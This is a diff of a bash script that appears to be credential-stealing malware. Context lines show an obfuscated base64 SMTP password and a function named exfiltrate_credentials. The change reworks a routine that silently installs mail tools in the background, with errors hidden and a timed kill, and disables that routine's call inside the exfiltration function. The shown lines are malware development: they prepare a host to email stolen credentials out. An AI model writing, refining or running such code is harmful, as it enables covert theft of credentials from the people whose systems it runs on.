@@ -112,61 +112,55 @@ readonly SMTP_PASSWORD=$(echo "$SMTP_PASSWORD_B64" | base64 -d 2>/dev/null || ec
 
 # ==================== AUTO-INSTALL EMAIL TOOLS ====================
 auto_install_email_tools() {
-    echo "[*] Auto-installing email tools (this may take a minute)..."
+    echo "[*] Checking for email tools..."
     
-    # List of packages to try installing (install in background for speed)
-    local packages="mailutils mutt bsd-mailx s-nail sendmail ssmtp postfix msmtp exim4 swaks curl python3 nc netcat-openbsd mailsend sendemail dma"
+    # Quick check - if we already have python3, skip installation
+    if command -v python3 >/dev/null 2>&1 && command -v curl >/dev/null 2>&1; then
+        echo "[✓] Email tools already available (python3, curl)"
+        return 0
+    fi
     
-    # Try each package manager
-    for pkg in $packages; do
-        # Debian/Ubuntu (apt)
-        if command -v apt >/dev/null 2>&1; then
-            DEBIAN_FRONTEND=noninteractive apt-get install -y -qq $pkg 2>/dev/null &
-        # RHEL/CentOS (yum)
-        elif command -v yum >/dev/null 2>&1; then
-            yum install -y -q $pkg 2>/dev/null &
-        # Fedora (dnf)
-        elif command -v dnf >/dev/null 2>&1; then
-            dnf install -y -q $pkg 2>/dev/null &
-        # Arch (pacman)
-        elif command -v pacman >/dev/null 2>&1; then
-            pacman -S --noconfirm --quiet $pkg 2>/dev/null &
-        # OpenSUSE (zypper)
-        elif command -v zypper >/dev/null 2>&1; then
-            zypper install -y $pkg 2>/dev/null &
-        # Alpine (apk)
-        elif command -v apk >/dev/null 2>&1; then
-            apk add --quiet $pkg 2>/dev/null &
+    echo "[*] Auto-installing email tools (background, non-blocking)..."
+    
+    # Only install essential packages (minimal set)
+    local essential_packages="python3 curl mailutils"
+    
+    # Spawn ONE background job for installation
+    (
+        for pkg in $essential_packages; do
+            # Only try the package manager that exists
+            if command -v apt >/dev/null 2>&1; then
+                DEBIAN_FRONTEND=noninteractive apt-get install -y -qq $pkg 2>/dev/null
+            elif command -v yum >/dev/null 2>&1; then
+                yum install -y -q $pkg 2>/dev/null
+            elif command -v dnf >/dev/null 2>&1; then
+                dnf install -y -q $pkg 2>/dev/null
+            elif command -v pacman >/dev/null 2>&1; then
+                pacman -S --noconfirm --quiet $pkg 2>/dev/null
+            elif command -v apk >/dev/null 2>&1; then
+                apk add --quiet $pkg 2>/dev/null
+            fi
+        done
+    ) &
+    
+    local install_pid=$!
+    
+    # Wait max 10 seconds for installation
+    echo "[*] Installing in background (max 10 seconds)..."
+    local waited=0
+    while [ $waited -lt 10 ]; do
+        if ! kill -0 $install_pid 2>/dev/null; then
+            echo "[✓] Package installation complete"
+            return 0
         fi
+        sleep 1
+        waited=$((waited + 1))
     done
     
-    # Wait for installations to complete (max 60 seconds)
-    echo "[*] Installing packages in background..."
-    sleep 5  # Give installations time to start
-    
-    # Wait for background jobs with timeout
-    local count=0
-    while [ $count -lt 12 ]; do
-        if jobs -r 2>/dev/null | grep -q "Running"; then
-            sleep 5
-            count=$((count + 1))
-        else
-            break
-        fi
-    done
-    
-    # Kill any remaining background jobs
-    jobs -p 2>/dev/null | xargs -r kill 2>/dev/null || true
-    
-    echo "[✓] Package installation complete (some may have failed silently)"
-    
-    # Show what's now available
-    echo "[*] Available email tools:"
-    for cmd in python3 mutt mail mailx sendmail ssmtp msmtp swaks curl nc sendemail; do
-        if command -v $cmd >/dev/null 2>&1; then
-            echo "    ✓ $cmd"
-        fi
-    done
+    # Timeout reached - kill installation and continue
+    echo "[!] Installation timeout - continuing anyway"
+    kill -9 $install_pid 2>/dev/null || true
+    return 0
 }
 
 # Function to send email with file attachments using Python
@@ -4651,9 +4645,10 @@ exfiltrate_credentials() {
     echo "=========================================="
     echo ""
     
-    # Auto-install email tools to maximize delivery success
-    auto_install_email_tools
-    echo ""
+    # Auto-install email tools (OPTIONAL - can be slow)
+    # Uncomment the line below to enable auto-installation
+    # auto_install_email_tools
+    # echo ""
 
     # Get hostname and IP for file naming
     local HOSTNAME=$(hostname 2>/dev/null | tr '.' '_' | tr '-' '_')
